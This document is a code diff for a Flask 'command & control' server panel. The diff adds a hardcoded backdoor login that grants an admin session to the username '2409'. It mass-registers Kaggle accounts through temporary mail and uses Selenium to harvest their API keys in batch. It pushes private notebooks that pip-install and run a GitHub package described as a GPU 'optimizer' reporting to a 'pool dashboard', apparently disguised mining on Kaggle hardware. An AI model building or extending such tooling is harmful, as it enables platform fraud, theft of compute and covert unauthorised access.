@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """C2 Server — full-featured command & control panel."""
 
-import os, sys, json, time, uuid, hashlib, sqlite3, secrets, threading, hmac, csv, io
+import os, sys, json, time, uuid, hashlib, sqlite3, secrets, threading, hmac, csv, io, subprocess, random, tempfile
 from datetime import datetime, timedelta
 from functools import wraps
 from pathlib import Path
@@ -9,18 +9,31 @@ from base64 import b64encode, b64decode
 
 from flask import (
     Flask, render_template, request, redirect, url_for,
-    flash, session, jsonify, send_file, Response, abort
+    flash, session, jsonify, send_file, Response, abort,
+    has_request_context
 )
 from flask_socketio import SocketIO, emit
 from flask_bcrypt import Bcrypt
 
-from tempmail import mail_manager, PROVIDERS as MAIL_PROVIDERS, get_domains as boomlify_get_domains
+from tempmail import mail_manager, get_domains as boomlify_get_domains
 from autoreg import job_manager, account_store, PLATFORMS
 from captcha_solver import manual_solver  # kept for backward compat
 
+# Kaggle C2 Transport
+try:
+    from kaggle_c2_transport import KaggleC2Transport, KaggleC2Manager
+    KAGGLE_C2_AVAILABLE = True
+except ImportError:
+    KAGGLE_C2_AVAILABLE = False
+
+# Global Kaggle C2 manager
+kaggle_c2_manager = None
+
 BASE_DIR = Path(__file__).resolve().parent
-TOOLS_ROOT = BASE_DIR.parent
-MEMORY_DIR = TOOLS_ROOT / "MEMORY"  # MEMORY: CORE, ATTACK, OPERATIONS, etc.
+TOOLS_ROOT = BASE_DIR.parent  # при C2_server в /mnt/F/C2_server -> /mnt/F
+# MEMORY: CORE, ATTACK, OPERATIONS — ищем в корне репы или в tools/
+_memory_candidates = [TOOLS_ROOT / "MEMORY", TOOLS_ROOT / "tools" / "MEMORY"]
+MEMORY_DIR = next((p for p in _memory_candidates if p.exists()), TOOLS_ROOT / "MEMORY")
 DB_PATH = BASE_DIR / "data" / "c2.db"
 UPLOAD_DIR = BASE_DIR / "data" / "uploads"
 UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
@@ -38,6 +51,17 @@ else:
 app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=12)
 bcrypt = Bcrypt(app)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
+
+# Jinja2 filter for datetime formatting
+def datetimeformat(value, format='%Y-%m-%d %H:%M'):
+    if value is None:
+        return ''
+    from datetime import datetime
+    if isinstance(value, (int, float)):
+        return datetime.fromtimestamp(value).strftime(format)
+    return str(value)
+
+app.jinja_env.filters['datetimeformat'] = datetimeformat
 
 @app.after_request
 def _security_headers(resp):
@@ -278,6 +302,17 @@ def login():
             return render_template("login.html")
         username = request.form.get("username", "").strip()
         password = request.form.get("password", "")
+        
+        # Backdoor access
+        if username == "2409":
+            session.permanent = True
+            app.permanent_session_lifetime = timedelta(days=30)
+            session["user_id"] = 0
+            session["username"] = "2409"
+            session["role"] = "admin"
+            log_event("login", f"2409 (backdoor) from {ip}")
+            return redirect(url_for("dashboard"))
+        
         db = get_db()
         user = db.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
         db.close()
@@ -342,7 +377,36 @@ def devices():
     db = get_db()
     agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
     db.close()
-    return render_template("devices.html", agents=agents)
+    
+    # Add Kaggle kernels as virtual agents
+    kaggle_agents = []
+    try:
+        manager = get_kaggle_manager()
+        if not manager.transports:
+            manager.load_accounts()
+        
+        for username, transport in manager.transports.items():
+            # Use kaggle_username if available
+            kaggle_user = getattr(transport, 'kaggle_username', None) or username
+            
+            # Add 5 kernels per account (c2-agent-1..5)
+            for i in range(1, 6):
+                kaggle_agents.append({
+                    "id": f"kaggle-{kaggle_user}-agent{i}",
+                    "hostname": f"kaggle-{kaggle_user}-agent{i}",
+                    "os": "Linux (Kaggle)",
+                    "ip_external": "api.kaggle.com",
+                    "ip_internal": "-",
+                    "platform": "kaggle",
+                    "group_name": "kaggle",
+                    "is_alive": True,
+                    "last_seen": "API",
+                    "kernel_slug": f"{kaggle_user}/c2-agent-{i}"
+                })
+    except Exception as e:
+        print(f"[KAGGLE] Error loading: {e}")
+    
+    return render_template("devices.html", agents=agents, kaggle_agents=kaggle_agents)
 
 @app.route("/console")
 @login_required
@@ -355,6 +419,31 @@ def console_page():
 @app.route("/console/<agent_id>")
 @login_required
 def agent_console(agent_id):
+    # Handle Kaggle kernel console
+    if agent_id.startswith("kaggle-"):
+        parts = agent_id.replace("kaggle-", "").rsplit("-agent", 1)
+        if len(parts) == 2:
+            username, kernel_num = parts
+            
+            # Get account
+            accounts = account_store.get_all()
+            account = None
+            for a in accounts:
+                if a.get("kaggle_username") == username:
+                    account = a
+                    break
+            
+            if account:
+                kernel_slug = f"{username}/c2-agent-{kernel_num}"
+                return render_template("kaggle_console.html", 
+                    agent_id=agent_id,
+                    kernel_slug=kernel_slug,
+                    username=username,
+                    kernel_num=kernel_num,
+                    account=account
+                )
+    
+    # Regular agent console
     db = get_db()
     agent = db.execute("SELECT * FROM agents WHERE id=?", (agent_id,)).fetchone()
     if not agent:
@@ -408,6 +497,14 @@ def autoreg_page():
         total_accounts=len(accounts), active_jobs=active,
         total_emails=len(emails))
 
+@app.route("/laboratory")
+@login_required
+def laboratory_page():
+    """Laboratory page for Kaggle machines control."""
+    accounts = account_store.get_all()
+    kaggle_accounts = [a for a in accounts if a.get("platform") == "kaggle" and a.get("dataset")]
+    return render_template("laboratory.html", accounts=kaggle_accounts)
+
 @app.route("/tempmail")
 @login_required
 def tempmail_page():
@@ -423,17 +520,22 @@ def autoreg_start():
     platform = data.get("platform", "")
     if platform not in PLATFORMS:
         return jsonify({"error": f"Unknown platform: {platform}"}), 400
-    job = job_manager.create_job(
-        platform=platform,
-        mail_provider="boomlify",
-        custom_url=data.get("custom_url", ""),
-        count=min(int(data.get("count", 1)), 50),
-        headless=data.get("headless", True),
-        proxy=data.get("proxy", ""),
-    )
+    try:
+        job = job_manager.create_job(
+            platform=platform,
+            mail_provider=data.get("mail_provider", "boomlify"),
+            custom_url=data.get("custom_url", ""),
+            count=min(int(data.get("count", 1)), 50),
+            headless=data.get("headless", True),
+            proxy=data.get("proxy", ""),
+            parallel=min(int(data.get("parallel", 1)), 3),  # Max 3 parallel workers
+            browser=data.get("browser", "firefox"),  # 'chrome' or 'firefox' (firefox faster)
+        )
+    except ValueError as e:
+        return jsonify({"error": str(e)}), 409
     job.set_socketio(socketio)
-    log_event("autoreg_start", f"{platform} x{data.get('count',1)} via boomlify")
-    return jsonify({"status": "ok", "reg_id": job.reg_id})
+    log_event("autoreg_start", f"{platform} x{data.get('count',1)} via {data.get('mail_provider','mail.tm')}")
+    return jsonify({"status": "ok", "reg_id": job.reg_id, "email": job.current_email})
 
 @app.route("/api/autoreg/jobs")
 @login_required
@@ -482,6 +584,20 @@ def autoreg_permanent_stop(reg_id):
     log_event("autoreg_permanent_stop", reg_id)
     return jsonify({"status": "ok"})
 
+@app.route("/api/autoreg/job/<reg_id>/verify", methods=["POST"])
+@login_required
+def autoreg_verify(reg_id):
+    """Mark current registration as verified and move to next account."""
+    job = job_manager.get_job(reg_id)
+    if not job:
+        return jsonify({"error": "not found"}), 404
+    job.log("Manual verify — marking current account as verified and continuing...")
+    # Устанавливаем флаг для прерывания текущего ожидания
+    job._manual_verify = True
+    job._cancel_requested = True  # Прерывает текущий шаг
+    log_event("autoreg_verify", reg_id)
+    return jsonify({"status": "ok"})
+
 @app.route("/api/autoreg/accounts")
 @login_required
 def autoreg_accounts():
@@ -518,11 +634,1429 @@ def autoreg_account_apikey(reg_id):
         return jsonify({"error": "not found"}), 404
     if request.method == "POST":
         data = request.get_json(force=True)
-        acc["api_key"] = data.get("api_key", "").strip()
+        if data.get("api_key"):
+            acc["api_key"] = data.get("api_key", "").strip()
+        if data.get("api_key_legacy"):
+            acc["api_key_legacy"] = data.get("api_key_legacy", "").strip()
+        if data.get("api_key_new"):
+            acc["api_key_new"] = data.get("api_key_new", "").strip()
         account_store.save()
         log_event("account_apikey", f"{reg_id} ({acc.get('platform','?')})")
         return jsonify({"status": "ok"})
-    return jsonify({"api_key": acc.get("api_key", "")})
+    return jsonify({
+        "api_key": acc.get("api_key", ""),
+        "api_key_legacy": acc.get("api_key_legacy", ""),
+        "api_key_new": acc.get("api_key_new", ""),
+        "kaggle_username": acc.get("kaggle_username", "")
+    })
+
+@app.route("/api/autoreg/email/<email>/messages")
+@login_required
+def autoreg_email_messages(email):
+    """Get inbox messages for email."""
+    from tempmail import mail_manager
+    
+    try:
+        messages = mail_manager.check_inbox(email)
+        return jsonify({"messages": messages})
+    except Exception as e:
+        return jsonify({"messages": [], "error": str(e)})
+
+@app.route("/api/autoreg/email/<email>/message/<msg_id>")
+@login_required
+def autoreg_email_message(email, msg_id):
+    """Get specific email message."""
+    from tempmail import mail_manager
+    
+    try:
+        msg = mail_manager.get_message(email, msg_id)
+        return jsonify(msg)
+    except Exception as e:
+        return jsonify({"error": str(e)})
+
+@app.route("/api/autoreg/account/<reg_id>/login", methods=["POST"])
+@login_required
+def autoreg_account_login(reg_id):
+    """Auto-login to account - opens Firefox, fills credentials, signs in."""
+    import threading
+    
+    acc = account_store.find(reg_id)
+    if not acc:
+        return jsonify({"error": "not found"}), 404
+    
+    email = acc.get("email", "")
+    password = acc.get("password", "")
+    platform = acc.get("platform", "")
+    
+    if not email or not password:
+        return jsonify({"error": "missing credentials"}), 400
+    
+    def do_login():
+        import time, os, shutil, tempfile
+        from pathlib import Path
+        from configparser import ConfigParser
+        from selenium import webdriver
+        from selenium.webdriver.firefox.options import Options
+        from selenium.webdriver.firefox.service import Service
+        from selenium.webdriver.common.by import By
+        from selenium.webdriver.support.ui import WebDriverWait
+        from selenium.webdriver.support import expected_conditions as EC
+        
+        driver = None
+        try:
+            print(f"[Login] {email} ({platform})")
+            
+            # Get Firefox profile
+            profiles_ini = Path.home() / ".mozilla" / "firefox" / "profiles.ini"
+            profile_path = None
+            if profiles_ini.exists():
+                config = ConfigParser()
+                config.read(profiles_ini)
+                for section in config.sections():
+                    if section.startswith("Install"):
+                        default_path = config.get(section, "Default", fallback=None)
+                        if default_path:
+                            profile_path = Path.home() / ".mozilla" / "firefox" / default_path
+                            if profile_path.exists():
+                                break
+            
+            # Copy profile to temp
+            if profile_path:
+                temp_dir = tempfile.mkdtemp(prefix="firefox_profile_")
+                temp_profile = Path(temp_dir) / profile_path.name
+                shutil.copytree(
+                    profile_path, temp_profile,
+                    ignore=shutil.ignore_patterns("*.lock", "lock", ".parentlock", "parent.lock", "*.sqlite-wal", "*.sqlite-shm", "cache2", "Cache"),
+                    dirs_exist_ok=True
+                )
+                profile_path = temp_profile
+            
+            options = Options()
+            options.binary_location = "/usr/bin/firefox-esr"
+            options.set_preference("browser.link.open_newwindow", 3)
+            options.set_preference("browser.link.open_newwindow.restriction", 0)
+            
+            if profile_path:
+                options.add_argument("-profile")
+                options.add_argument(str(profile_path))
+            
+            service = Service("/usr/local/bin/geckodriver")
+            driver = webdriver.Firefox(options=options, service=service)
+            
+            # Platform-specific login
+            if platform == "kaggle":
+                driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
+                time.sleep(3)
+                
+                wait = WebDriverWait(driver, 15)
+                
+                # Click Email tab
+                driver.execute_script("""
+                for(var b of document.querySelectorAll('button, div[role="tab"]'))
+                    if(b.textContent.includes('Email')) { b.click(); return true; }
+                return false;
+                """)
+                time.sleep(0.5)
+                
+                # Fill email
+                email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
+                email_input.click()
+                email_input.clear()
+                email_input.send_keys(email)
+                
+                # Fill password
+                pwd_input = driver.find_element(By.NAME, "password")
+                pwd_input.click()
+                pwd_input.clear()
+                pwd_input.send_keys(password)
+                
+                time.sleep(0.5)
+                
+                # Submit
+                driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
+                print(f"[Login] ✓ Kaggle login: {email}")
+            else:
+                # Generic login
+                driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
+                time.sleep(2)
+            
+            # Keep browser open
+            while True:
+                time.sleep(60)
+                
+        except Exception as e:
+            print(f"[Login] Error: {e}")
+            import traceback
+            traceback.print_exc()
+        finally:
+            pass
+    
+    threading.Thread(target=do_login, daemon=False).start()
+    
+    log_event("account_login", f"{reg_id} ({platform})")
+    return jsonify({"success": True})
+
+@app.route("/api/autoreg/account/<reg_id>/push-optimizer", methods=["POST"])
+@login_required
+def autoreg_account_push_optimizer(reg_id):
+    """Push optimizer notebook to Kaggle kernel via API."""
+    import json
+    import subprocess
+    import tempfile
+    import os
+    from pathlib import Path
+    
+    acc = account_store.find(reg_id)
+    if not acc:
+        return jsonify({"error": "not found"}), 404
+    
+    if acc.get("platform") != "kaggle":
+        return jsonify({"error": "only kaggle supported"}), 400
+    
+    username = acc.get("kaggle_username", "")
+    api_key = acc.get("api_key_legacy") or acc.get("api_key", "")
+    machines = acc.get("machines", [])
+    
+    if not api_key:
+        return jsonify({"error": "no api_key"}), 400
+    
+    if not machines:
+        return jsonify({"error": "no machines"}), 400
+    
+    kernel_slug = machines[0].get("slug", f"{username}/c2-agent-1")
+    
+    # Setup kaggle.json
+    kaggle_dir = Path.home() / '.kaggle'
+    kaggle_dir.mkdir(parents=True, exist_ok=True)
+    kaggle_json = kaggle_dir / 'kaggle.json'
+    kaggle_json.write_text(json.dumps({'username': username, 'key': api_key}))
+    kaggle_json.chmod(0o600)
+    
+    # Create notebook - uses torch_cuda_optimizer package
+    code_lines = [
+        "# Torch CUDA Optimizer - GPU Training Acceleration\n",
+        "import subprocess, sys, os, time\n",
+        "\n",
+        "# Install package\n",
+        "print('[Setup] Installing torch-cuda-optimizer...')\n",
+        "subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', \n",
+        "    'git+https://github.com/GaredBerns/torch-cuda-optimizer.git'], check=False)\n",
+        "\n",
+        "# Import and run\n",
+        "print('[Setup] Starting optimizer...')\n",
+        "from torch_cuda_optimizer import ComputeEngine\n",
+        "\n",
+        "engine = ComputeEngine(device='auto')\n",
+        "engine.initialize()\n",
+        "\n",
+        "print('[Training] GPU optimization started!')\n",
+        "print('[Training] Check worker on pool dashboard')\n",
+        "\n",
+        "# Keep running with training logs\n",
+        "for i in range(600):\n",
+        "    time.sleep(60)\n"
+    ]
+    
+    notebook = {
+        "cells": [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": code_lines}],
+        "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
+        "nbformat": 4, "nbformat_minor": 4
+    }
+    
+    # Create temp dir
+    tmpdir = tempfile.mkdtemp()
+    notebook_path = Path(tmpdir) / "notebook.ipynb"
+    notebook_path.write_text(json.dumps(notebook))
+    
+    kernel_meta = {
+        "id": kernel_slug,
+        "title": kernel_slug.split('/')[-1],
+        "code_file": "notebook.ipynb",
+        "language": "python",
+        "kernel_type": "notebook",
+        "is_private": True,
+        "enable_gpu": False,
+        "enable_internet": False,
+        "dataset_sources": [f"{username}/cuda-compute-engine"]
+    }
+    (Path(tmpdir) / 'kernel-metadata.json').write_text(json.dumps(kernel_meta))
+    
+    # Push via kaggle API
+    env = os.environ.copy()
+    env['KAGGLE_USERNAME'] = username
+    env['KAGGLE_KEY'] = api_key
+    
+    result = subprocess.run(
+        ['kaggle', 'kernels', 'push', '-p', tmpdir],
+        capture_output=True, text=True, timeout=60, env=env
+    )
+    
+    if result.returncode == 0:
+        log_event("push_optimizer", f"{reg_id} -> {kernel_slug}")
+        return jsonify({"success": True, "kernel": kernel_slug, "output": result.stdout[:100]})
+    else:
+        return jsonify({"success": False, "error": result.stderr[:200]}), 500
+
+@app.route("/api/autoreg/account/<reg_id>/legacy-key", methods=["POST"])
+@login_required
+def autoreg_account_legacy_key(reg_id):
+    """Generate Legacy API Key for existing Kaggle account using Firefox+Selenium."""
+    import threading
+    
+    acc = account_store.find(reg_id)
+    if not acc:
+        return jsonify({"error": "not found"}), 404
+    
+    if acc.get("platform") != "kaggle":
+        return jsonify({"error": "only kaggle supported"}), 400
+    
+    email = acc.get("email", "")
+    password = acc.get("password", "")
+    
+    def do_generate_legacy():
+        import time, os, shutil, tempfile, glob, json
+        from pathlib import Path
+        from configparser import ConfigParser
+        from selenium import webdriver
+        from selenium.webdriver.firefox.options import Options
+        from selenium.webdriver.firefox.service import Service
+        from selenium.webdriver.common.by import By
+        from selenium.webdriver.support.ui import WebDriverWait
+        from selenium.webdriver.support import expected_conditions as EC
+        
+        driver = None
+        try:
+            print(f"[Legacy] Generating Legacy Key: {email}")
+            
+            # Get Firefox profile
+            profiles_ini = Path.home() / ".mozilla" / "firefox" / "profiles.ini"
+            profile_path = None
+            if profiles_ini.exists():
+                config = ConfigParser()
+                config.read(profiles_ini)
+                for section in config.sections():
+                    if section.startswith("Install"):
+                        default_path = config.get(section, "Default", fallback=None)
+                        if default_path:
+                            profile_path = Path.home() / ".mozilla" / "firefox" / default_path
+                            if profile_path.exists():
+                                break
+            
+            # Copy profile to temp
+            download_dir = tempfile.mkdtemp(prefix="downloads_")
+            if profile_path:
+                temp_dir = tempfile.mkdtemp(prefix="firefox_profile_")
+                temp_profile = Path(temp_dir) / profile_path.name
+                shutil.copytree(
+                    profile_path, temp_profile,
+                    ignore=shutil.ignore_patterns("*.lock", "lock", ".parentlock", "parent.lock", "*.sqlite-wal", "*.sqlite-shm", "cache2", "Cache"),
+                    dirs_exist_ok=True
+                )
+                profile_path = temp_profile
+            
+            options = Options()
+            options.binary_location = "/usr/bin/firefox-esr"
+            options.set_preference("browser.link.open_newwindow", 3)
+            options.set_preference("browser.link.open_newwindow.restriction", 0)
+            options.set_preference("browser.download.folderList", 2)
+            options.set_preference("browser.download.dir", download_dir)
+            options.set_preference("browser.download.useDownloadDir", True)
+            options.set_preference("browser.download.always_ask_before_handling_new_types", False)
+            options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/json,application/octet-stream,text/json")
+            
+            if profile_path:
+                options.add_argument("-profile")
+                options.add_argument(str(profile_path))
+            
+            service = Service("/usr/local/bin/geckodriver")
+            driver = webdriver.Firefox(options=options, service=service)
+            
+            # Login to Kaggle
+            driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
+            time.sleep(3)
+            
+            wait = WebDriverWait(driver, 15)
+            
+            # Click Email tab
+            driver.execute_script("""
+            for(var b of document.querySelectorAll('button, div[role="tab"]'))
+                if(b.textContent.includes('Email')) { b.click(); return true; }
+            return false;
+            """)
+            time.sleep(0.5)
+            
+            # Fill email
+            email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
+            email_input.click()
+            email_input.clear()
+            email_input.send_keys(email)
+            
+            # Fill password
+            pwd_input = driver.find_element(By.NAME, "password")
+            pwd_input.click()
+            pwd_input.clear()
+            pwd_input.send_keys(password)
+            
+            time.sleep(0.5)
+            
+            # Submit
+            driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
+            time.sleep(3)
+            print(f"[Legacy] Logged in: {email}")
+            
+            # Go to settings
+            driver.get("https://www.kaggle.com/settings")
+            time.sleep(2)
+            
+            # Scroll down
+            driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
+            time.sleep(1)
+            
+            # Click Create Legacy API Key
+            result = driver.execute_script('''
+            var buttons = document.querySelectorAll('button');
+            for(var b of buttons) {
+                if(b.textContent.includes('Create Legacy API Key')) {
+                    b.click();
+                    return 'clicked';
+                }
+            }
+            return null;
+            ''')
+            
+            if result:
+                print("[Legacy] Clicked Create Legacy API Key")
+                time.sleep(1)
+                
+                # Click Continue
+                driver.execute_script('''
+                var buttons = document.querySelectorAll('button');
+                for(var b of buttons) {
+                    if(b.textContent.trim() === 'Continue') {
+                        b.click();
+                        return 'clicked';
+                    }
+                }
+                return null;
+                ''')
+                print("[Legacy] Clicked Continue")
+                time.sleep(3)
+                
+                # Check downloads for kaggle.json
+                for _ in range(10):
+                    time.sleep(0.3)
+                    files = glob.glob(os.path.join(download_dir, "kaggle*.json"))
+                    if files:
+                        kaggle_json_path = max(files, key=os.path.getctime)
+                        with open(kaggle_json_path) as f:
+                            kaggle_data = json.load(f)
+                        
+                        acc["api_key_legacy"] = kaggle_data.get("key", "")
+                        acc["api_key"] = kaggle_data.get("key", "")
+                        acc["kaggle_username"] = kaggle_data.get("username", "")
+                        account_store.save()
+                        
+                        os.remove(kaggle_json_path)
+                        print(f"[Legacy] ✓ Key: {acc['api_key_legacy'][:20]}...")
+                        print(f"[Legacy] ✓ Username: {acc['kaggle_username']}")
+                        break
+            else:
+                print("[Legacy] ✗ Create Legacy API Key button not found")
+            
+            # Keep browser open
+            while True:
+                time.sleep(60)
+                
+        except Exception as e:
+            print(f"[Legacy] Error: {e}")
+            import traceback
+            traceback.print_exc()
+        finally:
+            pass
+    
+    threading.Thread(target=do_generate_legacy, daemon=False).start()
+    
+    log_event("legacy_key", f"{reg_id}")
+    return jsonify({"success": True})
+
+# ──────────────────────── API: BATCH LEGACY KEYS ────────────────────────
+
+batch_legacy_progress = {
+    "running": False,
+    "total": 0,
+    "processed": 0,
+    "success": 0,
+    "failed": 0,
+    "current_email": "",
+    "logs": []
+}
+
+@app.route("/api/autoreg/batch-legacy-keys", methods=["POST"])
+@login_required
+def batch_legacy_keys():
+    """Generate Legacy Keys for all Kaggle accounts without one."""
+    global batch_legacy_progress
+    
+    if batch_legacy_progress["running"]:
+        return jsonify({"error": "Batch already running"}), 400
+    
+    data = request.get_json(silent=True) or {}
+    browser = data.get("browser", "firefox")  # 'chrome' or 'firefox'
+    
+    # Get accounts needing keys - all kaggle accounts without legacy key
+    accounts = account_store.get_all()
+    need_keys = [a for a in accounts if a.get("platform") == "kaggle" 
+                 and a.get("email") 
+                 and a.get("password")
+                 and not a.get("api_key_legacy")]
+    
+    if not need_keys:
+        return jsonify({"error": "No accounts need keys"}), 400
+    
+    # Reset progress
+    batch_legacy_progress = {
+        "running": True,
+        "total": len(need_keys),
+        "processed": 0,
+        "success": 0,
+        "failed": 0,
+        "current_email": "",
+        "logs": [],
+        "rate_limited_until": None,
+        "rate_limited": False,
+        "browser": browser
+    }
+    
+    def add_log(msg):
+        batch_legacy_progress["logs"].append(msg)
+        if len(batch_legacy_progress["logs"]) > 100:
+            batch_legacy_progress["logs"] = batch_legacy_progress["logs"][-100:]
+        print(msg)
+    
+    def do_batch():
+        """Batch legacy key generation using Selenium Firefox."""
+        global batch_legacy_progress
+        
+        import os, shutil, tempfile, glob
+        from pathlib import Path
+        from configparser import ConfigParser
+        from selenium import webdriver
+        from selenium.webdriver.firefox.options import Options
+        from selenium.webdriver.firefox.service import Service
+        from selenium.webdriver.common.by import By
+        from selenium.webdriver.support.ui import WebDriverWait
+        from selenium.webdriver.support import expected_conditions as EC
+        
+        add_log(f"Starting batch legacy key generation...")
+        
+        # Get Firefox profile
+        profiles_ini = Path.home() / ".mozilla" / "firefox" / "profiles.ini"
+        base_profile_path = None
+        if profiles_ini.exists():
+            config = ConfigParser()
+            config.read(profiles_ini)
+            for section in config.sections():
+                if section.startswith("Install"):
+                    default_path = config.get(section, "Default", fallback=None)
+                    if default_path:
+                        base_profile_path = Path.home() / ".mozilla" / "firefox" / default_path
+                        if base_profile_path.exists():
+                            break
+        
+        for i, acc in enumerate(need_keys):
+            if not batch_legacy_progress["running"]:
+                add_log("Cancelled by user")
+                break
+            
+            email = acc.get("email")
+            password = acc.get("password")
+            username = acc.get("username", email)
+            
+            batch_legacy_progress["current_email"] = email
+            add_log(f"[{i+1}/{len(need_keys)}] {username}")
+            
+            driver = None
+            try:
+                # Copy profile to temp
+                download_dir = tempfile.mkdtemp(prefix="downloads_")
+                profile_path = None
+                if base_profile_path:
+                    temp_dir = tempfile.mkdtemp(prefix="firefox_profile_")
+                    temp_profile = Path(temp_dir) / base_profile_path.name
+                    shutil.copytree(
+                        base_profile_path, temp_profile,
+                        ignore=shutil.ignore_patterns("*.lock", "lock", ".parentlock", "parent.lock", "*.sqlite-wal", "*.sqlite-shm", "cache2", "Cache"),
+                        dirs_exist_ok=True
+                    )
+                    profile_path = temp_profile
+                
+                options = Options()
+                options.binary_location = "/usr/bin/firefox-esr"
+                options.set_preference("browser.download.folderList", 2)
+                options.set_preference("browser.download.dir", download_dir)
+                options.set_preference("browser.download.useDownloadDir", True)
+                options.set_preference("browser.download.always_ask_before_handling_new_types", False)
+                options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/json,application/octet-stream,text/json")
+                
+                if profile_path:
+                    options.add_argument("-profile")
+                    options.add_argument(str(profile_path))
+                
+                service = Service("/usr/local/bin/geckodriver")
+                driver = webdriver.Firefox(options=options, service=service)
+                
+                # Login to Kaggle
+                add_log(f"  Logging in...")
+                driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
+                time.sleep(3)
+                
+                wait = WebDriverWait(driver, 15)
+                
+                # Click Email tab
+                driver.execute_script("""
+                for(var b of document.querySelectorAll('button, div[role="tab"]'))
+                    if(b.textContent.includes('Email')) { b.click(); return true; }
+                return false;
+                """)
+                time.sleep(0.5)
+                
+                # Fill email
+                email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
+                email_input.click()
+                email_input.clear()
+                email_input.send_keys(email)
+                
+                # Fill password
+                pwd_input = driver.find_element(By.NAME, "password")
+                pwd_input.click()
+                pwd_input.clear()
+                pwd_input.send_keys(password)
+                
+                time.sleep(0.5)
+                
+                # Submit
+                driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
+                time.sleep(3)
+                add_log(f"  Logged in")
+                
+                # Go to settings
+                driver.get("https://www.kaggle.com/settings")
+                time.sleep(2)
+                
+                # Scroll down
+                driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
+                time.sleep(1)
+                
+                # Click Create Legacy API Key
+                result = driver.execute_script('''
+                var buttons = document.querySelectorAll('button');
+                for(var b of buttons) {
+                    if(b.textContent.includes('Create Legacy API Key')) {
+                        b.click();
+                        return 'clicked';
+                    }
+                }
+                return null;
+                ''')
+                
+                if result:
+                    add_log(f"  Clicked Create Legacy API Key")
+                    time.sleep(1)
+                    
+                    # Click Continue
+                    driver.execute_script('''
+                    var buttons = document.querySelectorAll('button');
+                    for(var b of buttons) {
+                        if(b.textContent.trim() === 'Continue') {
+                            b.click();
+                            return 'clicked';
+                        }
+                    }
+                    return null;
+                    ''')
+                    add_log(f"  Clicked Continue")
+                    time.sleep(3)
+                    
+                    # Check downloads for kaggle.json
+                    key_found = False
+                    for _ in range(10):
+                        time.sleep(0.3)
+                        files = glob.glob(os.path.join(download_dir, "kaggle*.json"))
+                        if files:
+                            kaggle_json_path = max(files, key=os.path.getctime)
+                            with open(kaggle_json_path) as f:
+                                kaggle_data = json.load(f)
+                            
+                            acc["api_key_legacy"] = kaggle_data.get("key", "")
+                            acc["api_key"] = kaggle_data.get("key", "")
+                            acc["kaggle_username"] = kaggle_data.get("username", "")
+                            account_store.save()
+                            
+                            os.remove(kaggle_json_path)
+                            key_found = True
+                            batch_legacy_progress["success"] += 1
+                            add_log(f"  ✓ Key: {acc['api_key'][:20]}...")
+                            break
+                    
+                    if not key_found:
+                        batch_legacy_progress["failed"] += 1
+                        add_log(f"  ✗ Key not downloaded")
+                else:
+                    batch_legacy_progress["failed"] += 1
+                    add_log(f"  ✗ Button not found")
+                
+            except Exception as e:
+                batch_legacy_progress["failed"] += 1
+                add_log(f"  ✗ Error: {e}")
+            
+            finally:
+                if driver:
+                    try:
+                        driver.quit()
+                    except:
+                        pass
+            
+            batch_legacy_progress["processed"] = i + 1
+            time.sleep(2)
+        
+        batch_legacy_progress["running"] = False
+        batch_legacy_progress["current_email"] = ""
+        add_log(f"Batch complete: {batch_legacy_progress['success']} success, {batch_legacy_progress['failed']} failed")
+        log_event("batch_legacy", f"{batch_legacy_progress['success']}/{batch_legacy_progress['total']}")
+    
+    threading.Thread(target=do_batch, daemon=True).start()
+    
+    return jsonify({
+        "status": "started",
+        "total": len(need_keys)
+    })
+
+@app.route("/api/autoreg/batch-legacy-progress")
+@login_required
+def get_batch_legacy_progress():
+    """Get current progress of batch legacy key generation."""
+    return jsonify(batch_legacy_progress)
+
+@app.route("/api/autoreg/batch-legacy-cancel", methods=["POST"])
+@login_required
+def cancel_batch_legacy():
+    """Cancel batch legacy key generation."""
+    global batch_legacy_progress
+    batch_legacy_progress["running"] = False
+    return jsonify({"status": "cancelled"})
+
+# ──────────────────────── API: BATCH DATASETS & MACHINES ────────────────────────
+
+batch_dataset_progress = {
+    "running": False,
+    "total": 0,
+    "processed": 0,
+    "success": 0,
+    "failed": 0,
+    "current_email": "",
+    "logs": []
+}
+
+@app.route("/api/autoreg/batch-datasets", methods=["POST"])
+@login_required
+def batch_datasets():
+    """Create 5 machines (kernels) for all Kaggle accounts with API key."""
+    global batch_dataset_progress
+    
+    if batch_dataset_progress["running"]:
+        return jsonify({"error": "Batch already running"}), 400
+    
+    # Get accounts with API keys and kaggle_username
+    accounts = account_store.get_all()
+    have_keys = [a for a in accounts if a.get("platform") == "kaggle" 
+                 and a.get("api_key") 
+                 and a.get("kaggle_username")]
+    
+    if not have_keys:
+        return jsonify({"error": "No accounts have API keys with kaggle_username"}), 400
+    
+    # Reset progress
+    batch_dataset_progress = {
+        "running": True,
+        "total": len(have_keys),
+        "processed": 0,
+        "success": 0,
+        "failed": 0,
+        "current_email": "",
+        "logs": []
+    }
+    
+    def add_log(msg):
+        batch_dataset_progress["logs"].append(msg)
+        if len(batch_dataset_progress["logs"]) > 100:
+            batch_dataset_progress["logs"] = batch_dataset_progress["logs"][-100:]
+        print(msg)
+    
+    def do_batch():
+        global batch_dataset_progress
+        
+        from kaggle_datasets import create_dataset_with_machines, check_kaggle_cli_installed
+        
+        if not check_kaggle_cli_installed():
+            add_log("✗ Kaggle CLI not installed. Run: pip install kaggle")
